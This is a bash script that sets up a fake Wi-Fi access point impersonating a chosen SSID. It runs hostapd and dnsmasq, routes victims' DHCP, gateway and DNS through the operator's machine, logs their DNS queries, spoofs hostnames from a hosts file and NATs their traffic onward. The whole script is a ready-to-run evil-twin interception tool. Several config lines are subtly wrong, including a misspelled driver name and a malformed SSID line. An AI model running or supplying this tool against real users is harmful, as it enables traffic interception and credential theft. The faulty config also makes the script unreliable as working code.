#!/bin/bash
read -p "Enter Interface Name : " INTF
read -p "First IP in DHCP Range : " DH1
read -p "Last IP in DHCP Range : " DH2
read -p "DHCP Lease Duration (in Hour) : " DUR
read -p "Your Current IP Address : " IP
read -p "Enter SSID to Spoof : " SSID
read -p "Enter Channel Number : " CH
read -p "Enter Interface connected to the internet : " PINT

# ---- Create dnsmasq Config File ----
echo "interface=$INTF
dhcp-range=$DH1,$DH2,$DUR
dhcp-option=3,$IP
dhcp-option=6,$IP
server=8.8.8.8
log-queries
log-dhcp
" > zdnsmasq.conf
#---- Finish This part----

#----Create  hostapd Config File----
echo "interface =$INTF
driver=n180211 #n180211 is the new 802.11 netlink interface public header
ssid-$SSID
channel=$CH
" > zhostapd.conf
#----Finish This Part----

sudo sysctl -w net.ipv4.ip_forward=1 #Enable IP Forwarding to act like a Router
sudo iptables --flush #clear iptables rules
sudo iptables -P FORWARD ACCEPT
sudo iptables --table nat -A POSTROUTING -o $PINT -j MASQUERADE
pkill -f hostapd
pkill -f dnsmasq
airmon-ng check kill
ifconfig $INTF $IP/24
clear
echo "Fake AP is Running ... "
dnsmasq -C zdnsmasq.conf -H fakehost.conf -d & hostapd ./zhostapd.conf &
 